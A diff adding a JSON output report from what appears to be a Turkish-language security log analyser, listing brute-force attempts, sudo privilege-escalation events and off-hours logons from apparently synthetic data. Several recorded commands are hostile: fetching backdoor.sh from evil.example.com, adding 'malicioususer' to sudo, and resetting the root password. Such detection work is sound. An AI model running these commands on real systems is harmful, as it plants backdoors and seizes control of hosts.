@@ -1,0 +1,372 @@
+{
+  "summary": {
+    "total_events": 44,
+    "total_anomalies": 16,
+    "brute_force_count": 4,
+    "privilege_escalation_count": 7,
+    "suspicious_time_logon_count": 5,
+    "suspicious_process_count": 0,
+    "severity_breakdown": {
+      "low": 4,
+      "medium": 9,
+      "critical": 2,
+      "high": 1
+    },
+    "analysis_time": "2026-11-12T14:07:50.394759+00:00"
+  },
+  "brute_force": [
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "192.168.1.100",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "ubuntu",
+        "root",
+        "user",
+        "admin"
+      ],
+      "window_start": "2026-11-01T02:14:01",
+      "window_end": "2026-11-01T02:14:09",
+      "description": "192.168.1.100 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    },
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "203.0.113.42",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "ubuntu"
+      ],
+      "window_start": "2026-11-01T02:14:21",
+      "window_end": "2026-11-01T02:14:29",
+      "description": "203.0.113.42 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    },
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "198.51.100.7",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "jenkins",
+        "git",
+        "backup",
+        "docker",
+        "ftp"
+      ],
+      "window_start": "2026-11-01T02:15:30",
+      "window_end": "2026-11-01T02:15:38",
+      "description": "198.51.100.7 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    },
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "45.33.32.156",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "root"
+      ],
+      "window_start": "2026-11-02T01:11:00",
+      "window_end": "2026-11-02T01:11:08",
+      "description": "45.33.32.156 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    }
+  ],
+  "privilege_escalation": [
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-01T02:15:10",
+      "user": "ubuntu",
+      "command": "/bin/bash",
+      "event_type": "sudo_success",
+      "description": "ubuntu kullanıcısı tarafından sudo_success olayı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-01T02:15:12",
+      "user": "ubuntu",
+      "command": "/bin/su -",
+      "event_type": "sudo_success",
+      "description": "ubuntu kullanıcısı tarafından sudo_success olayı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "critical",
+      "timestamp": "2026-11-01T03:30:05",
+      "user": "jdoe",
+      "command": "/usr/bin/passwd root",
+      "event_type": "sudo_success",
+      "description": "Şüpheli komut ile yetki yükseltme: `/usr/bin/passwd root`"
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-01T09:05:00",
+      "user": "alice",
+      "command": "/usr/bin/apt-get update",
+      "event_type": "sudo_success",
+      "description": "alice kullanıcısı tarafından sudo_success olayı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "high",
+      "timestamp": "2026-11-02T01:10:00",
+      "user": "sysadmin",
+      "command": "",
+      "event_type": "sudo_failed",
+      "description": "sysadmin kullanıcısının sudo yetkisi başarısız oldu — olası brute-force."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "critical",
+      "timestamp": "2026-11-02T08:30:10",
+      "user": "bob",
+      "command": "/usr/sbin/usermod -aG sudo malicioususer",
+      "event_type": "sudo_success",
+      "description": "Şüpheli komut ile yetki yükseltme: `/usr/sbin/usermod -aG sudo malicioususer`"
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-02T08:30:20",
+      "user": "bob",
+      "command": "/usr/bin/wget http://evil.example.com/backdoor.sh",
+      "event_type": "sudo_success",
+      "description": "bob kullanıcısı tarafından sudo_success olayı."
+    }
+  ],
+  "suspicious_time_logons": [
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-01T02:15:00",
+      "user": "ubuntu",
+      "ip": "10.0.0.5",
+      "hour": 2,
+      "weekday": "Sunday",
+      "reason": "hafta sonu gece saati",
+      "description": "ubuntu kullanıcısı hafta sonu gece saati (2026-11-01 02:15:00) saatinde 10.0.0.5 adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-01T03:30:00",
+      "user": "jdoe",
+      "ip": "172.16.0.99",
+      "hour": 3,
+      "weekday": "Sunday",
+      "reason": "hafta sonu gece saati",
+      "description": "jdoe kullanıcısı hafta sonu gece saati (2026-11-01 03:30:00) saatinde 172.16.0.99 adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-01T23:45:00",
+      "user": "sysadmin",
+      "ip": "10.0.0.15",
+      "hour": 23,
+      "weekday": "Sunday",
+      "reason": "hafta sonu mesai dışı",
+      "description": "sysadmin kullanıcısı hafta sonu mesai dışı (2026-11-01 23:45:00) saatinde 10.0.0.15 adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-02T06:00:00",
+      "user": "root",
+      "ip": "",
+      "hour": 6,
+      "weekday": "Monday",
+      "reason": "mesai saati dışı",
+      "description": "root kullanıcısı mesai saati dışı (2026-11-02 06:00:00) saatinde  adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-02T06:00:01",
+      "user": "root",
+      "ip": "",
+      "hour": 6,
+      "weekday": "Monday",
+      "reason": "mesai saati dışı",
+      "description": "root kullanıcısı mesai saati dışı (2026-11-02 06:00:01) saatinde  adresinden oturum açtı."
+    }
+  ],
+  "suspicious_processes": [],
+  "all_anomalies": [
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "192.168.1.100",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "ubuntu",
+        "root",
+        "user",
+        "admin"
+      ],
+      "window_start": "2026-11-01T02:14:01",
+      "window_end": "2026-11-01T02:14:09",
+      "description": "192.168.1.100 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    },
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "203.0.113.42",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "ubuntu"
+      ],
+      "window_start": "2026-11-01T02:14:21",
+      "window_end": "2026-11-01T02:14:29",
+      "description": "203.0.113.42 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    },
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "198.51.100.7",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "jenkins",
+        "git",
+        "backup",
+        "docker",
+        "ftp"
+      ],
+      "window_start": "2026-11-01T02:15:30",
+      "window_end": "2026-11-01T02:15:38",
+      "description": "198.51.100.7 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    },
+    {
+      "anomaly_type": "brute_force",
+      "severity": "low",
+      "ip": "45.33.32.156",
+      "attempt_count": 5,
+      "unique_users_tried": [
+        "root"
+      ],
+      "window_start": "2026-11-02T01:11:00",
+      "window_end": "2026-11-02T01:11:08",
+      "description": "45.33.32.156 adresinden 300s içinde 5 başarısız giriş denemesi tespit edildi."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-01T02:15:00",
+      "user": "ubuntu",
+      "ip": "10.0.0.5",
+      "hour": 2,
+      "weekday": "Sunday",
+      "reason": "hafta sonu gece saati",
+      "description": "ubuntu kullanıcısı hafta sonu gece saati (2026-11-01 02:15:00) saatinde 10.0.0.5 adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-01T02:15:10",
+      "user": "ubuntu",
+      "command": "/bin/bash",
+      "event_type": "sudo_success",
+      "description": "ubuntu kullanıcısı tarafından sudo_success olayı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-01T02:15:12",
+      "user": "ubuntu",
+      "command": "/bin/su -",
+      "event_type": "sudo_success",
+      "description": "ubuntu kullanıcısı tarafından sudo_success olayı."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-01T03:30:00",
+      "user": "jdoe",
+      "ip": "172.16.0.99",
+      "hour": 3,
+      "weekday": "Sunday",
+      "reason": "hafta sonu gece saati",
+      "description": "jdoe kullanıcısı hafta sonu gece saati (2026-11-01 03:30:00) saatinde 172.16.0.99 adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "critical",
+      "timestamp": "2026-11-01T03:30:05",
+      "user": "jdoe",
+      "command": "/usr/bin/passwd root",
+      "event_type": "sudo_success",
+      "description": "Şüpheli komut ile yetki yükseltme: `/usr/bin/passwd root`"
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-01T09:05:00",
+      "user": "alice",
+      "command": "/usr/bin/apt-get update",
+      "event_type": "sudo_success",
+      "description": "alice kullanıcısı tarafından sudo_success olayı."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-01T23:45:00",
+      "user": "sysadmin",
+      "ip": "10.0.0.15",
+      "hour": 23,
+      "weekday": "Sunday",
+      "reason": "hafta sonu mesai dışı",
+      "description": "sysadmin kullanıcısı hafta sonu mesai dışı (2026-11-01 23:45:00) saatinde 10.0.0.15 adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "high",
+      "timestamp": "2026-11-02T01:10:00",
+      "user": "sysadmin",
+      "command": "",
+      "event_type": "sudo_failed",
+      "description": "sysadmin kullanıcısının sudo yetkisi başarısız oldu — olası brute-force."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-02T06:00:00",
+      "user": "root",
+      "ip": "",
+      "hour": 6,
+      "weekday": "Monday",
+      "reason": "mesai saati dışı",
+      "description": "root kullanıcısı mesai saati dışı (2026-11-02 06:00:00) saatinde  adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "suspicious_time_logon",
+      "severity": "medium",
+      "timestamp": "2026-11-02T06:00:01",
+      "user": "root",
+      "ip": "",
+      "hour": 6,
+      "weekday": "Monday",
+      "reason": "mesai saati dışı",
+      "description": "root kullanıcısı mesai saati dışı (2026-11-02 06:00:01) saatinde  adresinden oturum açtı."
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "critical",
+      "timestamp": "2026-11-02T08:30:10",
+      "user": "bob",
+      "command": "/usr/sbin/usermod -aG sudo malicioususer",
+      "event_type": "sudo_success",
+      "description": "Şüpheli komut ile yetki yükseltme: `/usr/sbin/usermod -aG sudo malicioususer`"
+    },
+    {
+      "anomaly_type": "privilege_escalation",
+      "severity": "medium",
+      "timestamp": "2026-11-02T08:30:20",
+      "user": "bob",
+      "command": "/usr/bin/wget http://evil.example.com/backdoor.sh",
+      "event_type": "sudo_success",
+      "description": "bob kullanıcısı tarafından sudo_success olayı."
+    }
+  ]
+}
